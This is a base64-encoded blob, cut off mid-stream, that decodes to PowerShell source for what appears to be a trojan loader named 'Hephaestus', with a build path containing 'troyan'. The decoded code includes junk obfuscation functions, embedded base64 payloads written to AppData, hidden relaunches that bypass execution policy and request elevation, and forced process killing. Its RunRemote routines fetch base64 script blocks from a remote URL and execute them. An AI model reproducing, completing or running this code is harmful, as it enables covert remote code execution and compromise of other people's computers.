5ZEpFdFhyZ3NmbnkwTHVyb0k5UGkwSVRwcGhKUVh6TW1RcUlETTlOc2owNmIvbTR1VEJ0dE1XWnFlWGJOUicrIA0KJ0dTOWNPYXBLckhqRHMvNzh6eUxDS1p5eTFhL1hMN0htK1lNU2xtdVRtMXRYWWp6WTl5aUpJems4MCtHSEJIc2FnOHNZUEZ6aitjd05iYmNhRVRVQnVNZ241WUpCSDhFNU9Sb24zdEZ1d0prdUZKbVNia0VudU5CMTZqcWMxMng3NWxMTTdnaTNSbXk4VDZGMTl2UTJBeTJwWlFKWUVKNklMRWZocEl3VzFFcnRJcmxGNzU2azNLWXR6bXpBTUM5VXB0Mm9NUWlhJysgDQonalVUUUhqMFhPdit3RndKcmFIdS92YTNmcEJIWHdPRUxKemFTUkZTblIzL3FmdnZVWVYyNWJGYStyL2w3eVNTT2c0UTVCY29FRmw1SGdLN3JXYnRUUG5jK1hOZWI2enRQcUppRld5ck0vSlF5aU9SR3QrZVhkRGt4Yyt2SUtYVlVkbkJRVjJGcnUwdEtxR2JsMEFTVi9BR0RUa2QrTS8yeEl2dEdhaWpBVHppT0NvM2VsZkZwR01GSkFOSlMyc240T0FENTRjYS8nKyANCid0TThFMGR6UisralJvdVJJZXA5WlRrdzQ4MVAxSHN6MzN5UStHK3lpaHR6MS9LYzFaS3lkY0hYcjhCZHUrbk9za3JwY0FZNFdJVEJzWTBPbmtidTI0TlhnWTlZZkpPSVJHS2RLOVE2S1pxRUZKNTJZalhSVlhIR0hCSGFiNVQ2UUt0UW9lSzVuS2cyVHRHU08vTEc1QUw4QzNSUzFnNFV5SlF1YndjT3lGYjNGQ3p0S1hIaGtqelBsbVM3TWdkVU56d2NraG1wNScrIA0KJ1k5QTRJU0ZqTGhQaEorNzQ0ZFpLZjNMNzkrTWxIVTRHQnRxd1Z6U3hRR2tZM3hJM1NSMHMwM3FUWFVXR2pkdWh0bHRyY1BqbktHbWNQMWlEL0xSUVFOcDlHYWxGdUdYbWxpdG5YcUJ3OE5VNGY5eXhONEQ1WlI2MHZxOXgxQXFaMmc1L0xuSmx6a3p6amRVWnhsdlFBWWc0cTJSSTdmTkFCQVFlR01VU3k1S2M4WSs1TW1HMm4xK3RWcEx1V3RHYyt2VFNGKzNZJysgDQonQk5CaGtOb1lTZHF4UGUrcVVuVGFyeGRxK1B1NTIveGJwK2tKRnpqSWYwUk1jY3h2RGYrY0FQWmVuaWtZUlRZc0IwUVM3eW1admhqaVBSWkp6anc1VmhzQWdzVVR6bW1wdGIyaGljczdGVTZRR0xNeU4rZGx4eTQyT1NaWHFwelV5UDcrOWMvY0EyM2o3aSs3MWRQUkNFbTdZWkpta0tSK0xyOFpFWlorenNNclpuLzVpSEFpQXJYcmZyVFloVERDcDdBNGEwbDMnKyANCidTVXZJdnloNEpnS3drMTNwYS82Q0V3VjN6Z1pyMmJQTW53VHVuVjZyTzBUMy9WbEJlODNVRWZMUXdEYTlmbXpPSFBNTDcxeVE1bEJTbDVrTjVaSUpEZGQ3UlczWGV1Z1ZVMlpvTG1EemhwZ3NDNC9SYUQrcVJCQ1doWnFZd2dESmcza3dPekFmTUFjR0JTc09Bd0lhQkJSRGowTWdSd2dsN0d3b2JRSGdMY3FhTFlISHN3UVV5Sk1yY2tYMFFwODZIaVhuaEpUTCcrIA0KJ09qK2tRTEFDQWdmUScNCiAgICB9DQogICAgICAgIA0KDQpmdW5jdGlvbiBmbl9Mb2dfbHNHNGhQN0J3ViB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KICAgIHdyaXRlZGJnMiAnTG9nOiAkbWVzc2FnZScNCn0NCmZ1bmN0aW9uIGZuX2haeUxLMTRTQ2Qgew0KICAgIHBhcmFtICgNCiAgICAgICAgW2ludF0kdmFyX0IyWVN4NkFNSFosDQogICAgICAgIFtpbnRdJHZhcl8wWjFqckJZbVZLDQogICAgKQ0KICAgICRyZXN1bHQgPSAkdmFyX0IyWVN4NkFNSFogKyAkdmFyXzBaMWpyQlltVksNCiAgICByZXR1cm4gJHJlc3VsdA0KfQ0KZnVuY3Rpb24gZm5faTR1alJvVWtFSCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbaW50XSR2YXJfMFoxanJCWW1WSywNCiAgICAgICAgW2ludF0kdmFyX0IyWVN4NkFNSFoNCiAgICApDQogICAgJHJlc3VsdCA9ICR2YXJfMFoxanJCWW1WSyArICR2YXJfQjJZU3g2QU1IWg0KICAgIHJldHVybiAkcmVzdWx0DQp9DQppZiAoJHZhcl9CMllTeDZBTUhaIC1ndCAyKSB7DQogICAgd3JpdGVkYmcyICdBNjlyTnU1elo0TGdzMXYnDQp9IGVsc2Ugew0KICAgIHdyaXRlZGJnMiAnQ1lVMUFQRzdKaDVmdGpPJw0KfQ0KaWYgKCR2YXJfMFoxanJCWW1WSyAtZ3QgMikgew0KICAgIHdyaXRlZGJnMiAneElqRGhMUmRTYVVUdzdsJw0KfSBlbHNlIHsNCiAgICB3cml0ZWRiZzIgJzlVNEJLZ2pNMEhBTE93YScNCn0NCiR2YXJfMFoxanJCWW1WSyA9IGZuX2haeUxLMTRTQ2QgLXBhcmFtMSA1MiAtcGFyYW0yIDIwDQp3cml0ZWRiZzIgJ0dvbk5Zdk9IWlNKOFZVbCcNCiR2YXJfQjJZU3g2QU1IWiA9IGZuX2haeUxLMTRTQ2QgLXBhcmFtMSA2MCAtcGFyYW0yIDg3DQp3cml0ZWRiZzIgJ29QdUZZQUdrVE5qY0o0VycNCiR2YXJfMFoxanJCWW1WSyA9IGZuX2haeUxLMTRTQ2QgLXBhcmFtMSA4NyAtcGFyYW0yIDUwDQp3cml0ZWRiZzIgJ2xlYWRpSG9rMkk2dWZTVycNCiR2YXJfQjJZU3g2QU1IWiA9IGZuX2k0dWpSb1VrRUggLXBhcmFtMSA3MyAtcGFyYW0yIDQ3DQp3cml0ZWRiZzIgJ3RWYTVFQkhseHV5SlJJcicNCiR2YXJfMFoxanJCWW1WSyA9IGZuX2k0dWpSb1VrRUggLXBhcmFtMSA5NyAtcGFyYW0yIDMNCndyaXRlZGJnMiAnYUlWVHFIaXdraEZDY1dyJw0KIAoKIyB1dGlscy5wczEKCg0KDQpmdW5jdGlvbiBJc0RlYnVnIHsNCiAgICAkZGVidWdGaWxlID0gIkM6XGRlYnVnLnR4dCINCiAgICANCiAgICB0cnkgew0KICAgICAgICAjIENoZWNrIGlmIHRoZSBmaWxlIGV4aXN0cw0KICAgICAgICBpZiAoVGVzdC1QYXRoICRkZWJ1Z0ZpbGUgLVBhdGhUeXBlIExlYWYpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgICAgICB9DQogICAgfSBjYXRjaCB7DQogICAgICAgICMgQ2F0Y2ggYW55IGVycm9ycyB0aGF0IG9jY3VyIGR1cmluZyB0aGUgVGVzdC1QYXRoIG9wZXJhdGlvbg0KICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgfQ0KfQ0KDQokZ2xvYmFsRGVidWcgPSBJc0RlYnVnOw0KDQpmdW5jdGlvbiB3cml0ZWRiZyB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRtc2csICAgW3N0cmluZ10kbXNnMj0iIg0KICAgICkNCiAgICAgICAgaWYgKCRnbG9iYWxEZWJ1Zyl7DQogICAgICAgICAgICBXcml0ZS1Ib3N0ICRtc2cgKyAkbXNnMg0KICAgICAgICB9DQp9DQoNCmZ1bmN0aW9uIFV0ZjhOb0JvbSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRkYXRhLA0KICAgICAgICBbc3RyaW5nXSRmaWxlDQogICAgKQ0KICAgICRzdHJlYW1Xcml0ZXIgPSBbU3lzdGVtLklPLlN0cmVhbVdyaXRlcl06Om5ldygkZmlsZSwgJGZhbHNlLCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4KQ0KICAgICRzdHJlYW1Xcml0ZXIuV3JpdGUoJGRhdGEpDQogICAgJHN0cmVhbVdyaXRlci5DbG9zZSgpDQogICAgJHdyaXR0ZW5Db250ZW50ID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlKQ0KICAgIGlmICgkd3JpdHRlbkNvbnRlbnQuTGVuZ3RoIC1nZSAzIC1hbmQgJHdyaXR0ZW5Db250ZW50WzBdIC1lcSAweEVGIC1hbmQgJHdyaXR0ZW5Db250ZW50WzFdIC1lcSAweEJCIC1hbmQgJHdyaXR0ZW5Db250ZW50WzJdIC1lcSAweEJGKSB7DQogICAgICAgICR3cml0dGVuQ29udGVudCA9ICR3cml0dGVuQ29udGVudFszLi4oJHdyaXR0ZW5Db250ZW50Lkxlbmd0aCAtIDEpXQ0KICAgIH0NCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRmaWxlLCAkd3JpdHRlbkNvbnRlbnQpDQp9DQoNCmZ1bmN0aW9uIEdldFV0Zk5vQm9tIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGZpbGUNCiAgICApDQoNCiAgICAkY29udGVudEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRmaWxlKQ0KDQogICAgaWYgKCRjb250ZW50Qnl0ZXMuTGVuZ3RoIC1nZSAzIC1hbmQgJGNvbnRlbnRCeXRlc1swXSAtZXEgMHhFRiAtYW5kICRjb250ZW50Qnl0ZXNbMV0gLWVxIDB4QkIgLWFuZCAkY29udGVudEJ5dGVzWzJdIC1lcSAweEJGKSB7DQogICAgICAgICRjb250ZW50Qnl0ZXMgPSAkY29udGVudEJ5dGVzWzMuLigkY29udGVudEJ5dGVzLkxlbmd0aCAtIDEpXQ0KICAgIH0NCiAgICAkY29udGVudFdpdGhvdXRCb20gPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZygkY29udGVudEJ5dGVzKQ0KDQogICAgcmV0dXJuICRjb250ZW50V2l0aG91dEJvbQ0KfQ0KDQpmdW5jdGlvbiBHZXQtSGVwaGFlc3R1c0ZvbGRlciB7DQogICAgJGFwcERhdGFQYXRoID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ0FwcGxpY2F0aW9uRGF0YScpDQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBKb2luLVBhdGggJGFwcERhdGFQYXRoICdIZXBoYWVzdHVzJw0KICAgIHJldHVybiAkaGVwaGFlc3R1c0ZvbGRlcg0KfQ0KDQpmdW5jdGlvbiBHZXQtSG9sZGVyUGF0aCB7DQogICAgJGhlcGhhZXN0dXNGb2xkZXIgPSBHZXQtSGVwaGFlc3R1c0ZvbGRlcg0KICAgICRzY3JpcHROYW1lID0gJ2hvbGRlcicgKyAnLicgKyAncHMxJw0KICAgICRob2xkZXJQYXRoID0gSm9pbi1QYXRoICRoZXBoYWVzdHVzRm9sZGVyIC1DaGlsZFBhdGggJHNjcmlwdE5hbWUNCiAgICByZXR1cm4gJGhvbGRlclBhdGgNCn0NCg0KZnVuY3Rpb24gR2V0LVNvbWVQYXRoIHsNCiAgICAkaGVwaGFlc3R1c0ZvbGRlciA9IEdldC1IZXBoYWVzdHVzRm9sZGVyDQogICAgJHNjcmlwdE5hbWUgPSAnc29tZScgKyAnLicgKyAncHMxJw0KICAgICRob2xkZXJQYXRoID0gSm9pbi1QYXRoICRoZXBoYWVzdHVzRm9sZGVyIC1DaGlsZFBhdGggJHNjcmlwdE5hbWUNCiAgICByZXR1cm4gJGhvbGRlclBhdGgNCn0NCg0KZnVuY3Rpb24gR2V0LUJvZHlQYXRoIHsNCiAgICAkaGVwaGFlc3R1c0ZvbGRlciA9IEdldC1IZXBoYWVzdHVzRm9sZGVyDQogICAgJHNjcmlwdE5hbWUgPSAnYm9keScgKyAnLicgKyAncHMxJw0KICAgICRib2R5UGF0aCA9IEpvaW4tUGF0aCAkaGVwaGFlc3R1c0ZvbGRlciAtQ2hpbGRQYXRoICRzY3JpcHROYW1lDQogICAgcmV0dXJuICRib2R5UGF0aA0KfQ0KDQpmdW5jdGlvbiBFeHRyYWN0RW1iZWRkaW5nIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGluQ29udGVudCwNCiAgICAgICAgW3N0cmluZ10kb3V0RmlsZQ0KICAgICkNCiAgICAkZGVjb2RlZEJ5dGVzID0gW0NvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRpbkNvbnRlbnQpDQogICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkb3V0RmlsZSwgJGRlY29kZWRCeXRlcykNCn0NCg0KZnVuY3Rpb24gVGVzdC1Bcmd7IHBhcmFtIChbc3RyaW5nXSRhcmcpDQogICAgJGdsb2JhbEFyZ3MgPSAkZ2xvYmFsOmFyZ3MgLWpvaW4gJyAnDQogICAgaWYgKCRnbG9iYWxBcmdzIC1saWtlICIqJGFyZyoiKSB7DQogICAgICAgIHJldHVybiAkdHJ1ZQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9IA0KDQpmdW5jdGlvbiBHZXQtQXJndW1lbnRWYWx1ZSB7DQogICAgcGFyYW0oDQogICAgICAgIFtzdHJpbmddJGFyZ05hbWUNCiAgICApDQogICAgJGFyZ3NYID0gJGdsb2JhbDphcmdzDQogICAgZm9yICgkaSA9IDA7ICRpIC1sdCAkYXJnc1guTGVuZ3RoOyAkaSsrKSB7DQogICAgICAgIGlmICgkYXJnc1hbJGldIC1lcSAkYXJnTmFtZSkgew0KICAgICAgICAgICAgcmV0dXJuICRhcmdzWFskaSArIDFdDQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuICIiICAjIFJldHVybiBudWxsIGlmIHRoZSBhcmd1bWVudCB3YXMgbm90IGZvdW5kDQp9DQoNCmZ1bmN0aW9uIFRlc3QtQXV0b3N0YXJ0IA0Kew0KICAgIHJldHVybiBUZXN0LUFyZyAtYXJnICJhdXRvc3RhcnQiDQp9DQoNCg0KZnVuY3Rpb24gUnVuTWUgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kc2NyaXB0LCANCiAgICAgICAgW3N0cmluZ10kYXJnLA0KICAgICAgICBbYm9vbF0kdWFjDQogICAgKQ0KDQogICAgdHJ5IA0KICAgIHsNCiAgICAgICAgJHNjcmlwdFBhdGggPSAkc2NyaXB0DQogICAgICAgIA0KICAgICAgICAkbG9jYWxBcmd1bWVudHMgPSBAKCItRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyIpDQogICAgICAgIA0KICAgICAgICAkZ2xvYmFsQXJncyA9ICRnbG9iYWw6YXJncw0KICAgICAgICBmb3JlYWNoICgkZ2xvYmFsQXJnIGluICRnbG9iYWxBcmdzKSB7DQogICAgICAgICAgICAkbG9jYWxBcmd1bWVudHMgKz0gIi1Bcmd1bWVudCBgIiRnbG9iYWxBcmdgIiINCiAgICAgICAgfQ0KDQogICAgICAgIGlmICgtbm90IFtzdHJpbmddOjpJc051bGxPckVtcHR5KCRhcmcpKSB7DQogICAgICAgICAgICAkbG9jYWxBcmd1bWVudHMgKz0gIi0kYXJnIg0KICAgICAgICB9DQoNCiAgICAgICAgJGxvY2FsQXJndW1lbnRMaXN0ID0gQCgiLUZpbGUiLCAiYCIkc2NyaXB0UGF0aGAiIikgKyAkbG9jYWxBcmd1bWVudHMNCiAgICAgICAgDQogICAgICAgIGlmICgkdWFjIC1lcSAkdHJ1ZSkgew0KICAgICAgICAgICAgJGFyZyA9ICItJGFyZyINCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbCAtQXJndW1lbnRMaXN0ICItTm9Qcm9maWxlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIGAiJHNjcmlwdFBhdGhgIiAkYXJnIC1WZXJib3NlIiAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuDQoNCiAgICAgICAgICAgICMkY21kPSJTdGFydC1Qcm9jZXNzIFBvd2Vyc2hlbGwgLVZlcmIgUnVuQXMgLVdhaXQgLUFyZ3VtZW50TGlzdCAnLU5vUHJvZmlsZSAtV2luZG93U3R5bGUgSGlkZGVuIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlIGAiJHNjcmlwdFBhdGhgIiAtJGFyZyciDQogICAgICAgICAgICMgcG93ZXJzaGVsbCAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtQ29tbWFuZCAkY21kDQogICAgICAgICAjICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtQXJndW1lbnRMaXN0ICRsb2NhbEFyZ3VtZW50TGlzdCAtVmVyYiBSdW5BcyAtV2luZG93U3R5bGUgSGlkZGVuDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgJGxvY2FsQXJndW1lbnRMaXN0IC1XaW5kb3dTdHlsZSBIaWRkZW4NCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICAgICAgd3JpdGVkYmcgIlJ1bk1lICRfIg0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSXNFbGV2YXRlZA0Kew0KICAgIGlmICgtTk9UIChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV06OkFkbWluaXN0cmF0b3IpKQ0KICAgIHsNCiAgICAgICAgcmV0dXJuICRmYWxzZQ0KICAgIH0NCiAgICByZXR1cm4gJHRydWUNCn0NCg0KDQpmdW5jdGlvbiBHZXQtRW52UGF0aHMgew0KICAgICRhID0gR2V0LUxvY2FsQXBwRGF0YVBhdGgNCiAgICAkYiA9ICBHZXQtQXBwRGF0YVBhdGgNCiAgICByZXR1cm4gQCgkYSAsICRiKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGVtcEZpbGUgew0KICAgICR0ZW1wUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBQYXRoKCkNCiAgICAkdGVtcEZpbGUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KICAgIHJldHVybiAkdGVtcEZpbGUNCn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsQXBwRGF0YVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpMb2NhbEFwcGxpY2F0aW9uRGF0YSkNCn0NCg0KZnVuY3Rpb24gR2V0LUFwcERhdGFQYXRoIHsNCiAgICByZXR1cm4gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoW1N5c3RlbS5FbnZpcm9ubWVudCtTcGVjaWFsRm9sZGVyXTo6QXBwbGljYXRpb25EYXRhKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHJvZmlsZVBhdGggew0KICAgIHJldHVybiBbU3lzdGVtLkVudmlyb25tZW50XTo6R2V0Rm9sZGVyUGF0aChbU3lzdGVtLkVudmlyb25tZW50K1NwZWNpYWxGb2xkZXJdOjpVc2VyUHJvZmlsZSkNCn0NCg0KZnVuY3Rpb24gQ2xvc2UtUHJvY2Vzc2VzIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmdbXV0kcHJvY2Vzc2VzDQogICAgKQ0KDQogICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJFByb2Nlc3Nlcykgew0KICAgICAgICAkY29tbWFuZCA9ICJ0YXNra2lsbC5leGUgL2ltICRwcm9jZXNzIC9mIg0KICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAkY29tbWFuZA0KICAgIH0NCn0NCg0KZnVuY3Rpb24gR2V0LVRlbXBQcyB7DQogICAgIyBHZW5lcmF0ZSBhIHVuaXF1ZSB0ZW1wb3JhcnkgZmlsZSBuYW1lIGluIHRoZSB0ZW1wIGRpcmVjdG9yeQ0KICAgICR0ZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldFRlbXBGaWxlTmFtZSgpDQoNCiAgICAjIENoYW5nZSB0aGUgZmlsZSBleHRlbnNpb24gdG8gLnBzMQ0KICAgICRwczFUZW1wRmlsZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkNoYW5nZUV4dGVuc2lvbigkdGVtcEZpbGUsICIucHMxIikNCg0KICAgIHJldHVybiAkcHMxVGVtcEZpbGUNCn0NCg0KIyBuZXZlciBjaGFuZ2UgZGVmIHZhbHVlcw0KZnVuY3Rpb24gUnVuUmVtb3RlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGJhc2VVcmwsDQogICAgICAgIFtzdHJpbmddJGJsb2NrLA0KICAgICAgICBbc3RyaW5nXSRwYXJhbSA9ICRudWxsLA0KICAgICAgICBbYm9vbF0kaXNXYWl0ID0gJHRydWUsDQogICAgICAgIFtib29sXSRpc0pvYiA9ICRmYWxzZQ0KICAgICkNCiAgICAkY21kID0gImRvXyRibG9jayINCiAgICBpZiAoJHBhcmFtIC1uZSAkbnVsbCkNCiAgICB7DQogICAgICAgICRjbWQgKz0gIiAtcGFyYW0gJyRwYXJhbSciDQogICAgfQ0KICAgICR1cmwgPSAiJGJhc2VVcmwkYmxvY2sudHh0Ig0KICAgICR0aW1lb3V0ID0gW2RhdGV0aW1lXTo6VXRjTm93LkFkZE1pbnV0ZXMoNSkNCiAgICAkZGVsYXkgPSAxMA0KICAgIHdoaWxlIChbZGF0ZXRpbWVdOjpVdGNOb3cgLWx0ICR0aW1lb3V0KSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLVVzZUJhc2ljUGFyc2luZyAtTWV0aG9kIEdldA0KICAgICAgICAgICAgaWYgKCRyZXNwb25zZS5TdGF0dXNDb2RlIC1lcSAyMDApIHsNCiAgICAgICAgICAgICAgICAkc2NyaXB0RGF0YSA9ICRyZXNwb25zZS5Db250ZW50DQogICAgICAgICAgICAgICAgJHNjcmlwdERhdGEgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHNjcmlwdERhdGEpKSArICJgbmBuIiArICRjbWQNCiAgICAgICAgICAgICAgICBpZiAoJGdsb2JhbERlYnVnKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFV0ZjhOb0JvbSAtZGF0YSAkc2NyaXB0RGF0YSAtZmlsZSAiQzpcU29mdFxoZXBoYWVzdHVzXHRyb3lhblxfb3V0cHV0XF90ZW1wXyRibG9jay5wczEiICAgICAgDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkY29kZUJsb2NrID0gW1NjcmlwdEJsb2NrXTo6Q3JlYXRlKCRzY3JpcHREYXRhKQ0KICAgICAgICAgICAgICAgIGlmICgkaXNKb2IpIHsNCiAgICAgICAgICAgICAgICAgICAgJGdlbmVyYWxKb2IgPSBTdGFydC1Kb2IgLVNjcmlwdEJsb2NrICRjb2RlQmxvY2sNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRpc1dhaXQpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFdhaXQtSm9iIC1Kb2IgJGdlbmVyYWxKb2IgLVRpbWVvdXQgMzAwIHwgT3V0LU51bGwNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkZ2VuZXJhbEpvYi5TdGF0ZSAtZXEgJ0NvbXBsZXRlZCcpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gUmVjZWl2ZS1Kb2IgLUpvYiAkZ2VuZXJhbEpvYg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIFJlbW92ZS1Kb2IgLUpvYiAkZ2VuZXJhbEpvYg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkcmVzdWx0DQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdyaXRlZGJnICJKb2IgZGlkIG5vdCBjb21wbGV0ZSB3aXRoaW4gdGhlIHRpbWVvdXQgcGVyaW9kLiINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZW1vdmUtSm9iIC1Kb2IgJGdlbmVyYWxKb2INCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJGNvZGVCbG9jayA9IFtTY3JpcHRCbG9ja106OkNyZWF0ZSgkc2NyaXB0RGF0YSkNCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRjb2RlQmxvY2sNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJGYWlsZWQgdG8gcnVucmVtb3RlICR1cmwgJF8iDQogICAgICAgIH0gDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheQ0KICAgIH0gDQogICAgd3JpdGVkYmcgIkZhaWxlZCB0byBydW4gcmVtb3RlICR1cmwgd2l0aGluIHRoZSBhbGxvdHRlZCB0aW1lLiINCn0NCg0KZnVuY3Rpb24gUnVuUmVtb3RlQXN5bmMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kYmFzZVVybCwNCiAgICAgICAgW3N0cmluZ10kYmxvY2ssDQogICAgICAgIFtzdHJpbmddJHBhcmFtID0gJG51bGwNCiAgICApDQogICAgJHVybCA9ICIkYmFzZVVybC8kYmxvY2sudHh0Ig0KICAgICRjbWQgPSAiZG9fJGJsb2NrIg0KICAgIGlmICgkcGFyYW0gLW5lICRudWxsKQ0KICAgIHsNCiAgICAgICAgJGNtZCArPSAiIC1wYXJhbSAnJHBhcmFtJyINCiAgICB9DQogICAgJGFzeW5jSm9iID0gU3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7DQogICAgICAgIHBhcmFtICgNCiAgICAgICAgICAgIFtzdHJpbmddJHVybCwgW3N0cmluZ10kYmxvY2ssIFtzdHJpbmddJGNtZCwgW2Jvb2xdJGRlYnVnDQogICAgICAgICkNCg0KICAgICAgICBmdW5jdGlvbiBVdGY4Tm9Cb20gew0KICAgICAgICAgICAgcGFyYW0gKA0KICAgICAgICAgICAgICAgIFtzdHJpbmddJGRhdGEsDQogICAgICAgICAgICAgICAgW3N0cmluZ10kZmlsZQ0KICAgICAgICAgICAgKQ0KICAgICAgICAgICAgJHN0cmVhbVdyaXRlciA9IFtTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyXTo6bmV3KCRmaWxlLCAkZmFsc2UsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjgpDQogICAgICAgICAgICAkc3RyZWFtV3JpdGVyLldyaXRlKCRkYXRhKQ0KICAgICAgICAgICAgJHN0cmVhbVdyaXRlci5DbG9zZSgpDQogICAgICAgICAgICAkd3JpdHRlbkNvbnRlbnQgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJGZpbGUpDQogICAgICAgICAgICBpZiAoJHdyaXR0ZW5Db250ZW50Lkxlbmd0aCAtZ2UgMyAtYW5kICR3cml0dGVuQ29udGVudFswXSAtZXEgMHhFRiAtYW5kICR3cml0dGVuQ29udGVudFsxXSAtZXEgMHhCQiAtYW5kICR3cml0dGVuQ29udGVudFsyXSAtZXEgMHhCRikgew0KICAgICAgICAgICAgICAgICR3cml0dGVuQ29udGVudCA9ICR3cml0dGVuQ29udGVudFszLi4oJHdyaXR0ZW5Db250ZW50Lkxlbmd0aCAtIDEpXQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgW1N5c3RlbS5JTy5GaWxlXTo6V3JpdGVBbGxCeXRlcygkZmlsZSwgJHdyaXR0ZW5Db250ZW50KQ0KICAgICAgICB9DQoNCiAgICAgICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcyg1KQ0KICAgICAgICAkZGVsYXkgPSAxMA0KICAgICAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgew0KICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBJ